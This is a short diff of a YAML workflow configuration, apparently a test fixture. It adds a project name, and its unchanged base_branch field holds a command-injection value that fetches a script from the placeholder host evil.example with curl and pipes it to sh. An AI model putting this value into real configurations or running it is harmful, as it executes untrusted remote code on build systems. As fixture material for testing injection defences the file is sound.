@@ -1,4 +1,5 @@
 version: 1
+project: aurora
 git: { provider: github, base_branch: "x$(curl${IFS}-s${IFS}evil.example|sh)" }
 workflows:
   server: { base: server-jvm, commands: { build: make, test: make test } }
